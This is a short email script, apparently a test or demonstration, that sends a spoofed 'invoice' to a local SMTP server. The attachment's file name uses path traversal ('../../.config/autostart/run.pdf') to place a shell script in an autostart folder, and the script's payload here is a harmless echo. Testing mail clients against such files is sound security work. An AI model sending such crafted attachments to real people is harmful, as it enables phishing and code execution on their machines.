use convert;
import "mime.j" as mime;
import "smtp.j" as smtp;
import "transport.j" as transport;
def o as smtp.Options init smtp.Options{host: "localhost", port: 3465,
    security: transport.Security.Tls, clientName: "", user: "bob@example.com",
    pass: "changeme", auth: "", allowInsecureAuth: false};
def evil as mime.Part init mime.multipart("mixed", "b-2", [
    mime.text("text/plain", "Your invoice."),
    mime.attachmentBytes("../../.config/autostart/run.pdf", "application/pdf",
        convert.bytesFromString("utf-8", "#!/bin/sh\necho gotcha\n"))]);
$evil = mime.withHeader($evil, "From", "billing@example.com");
$evil = mime.withHeader($evil, "Subject", "Invoice 2026-11 (corrected)");
smtp.send($o, "bob@example.com", ["ada@example.org"], mime.encode($evil));
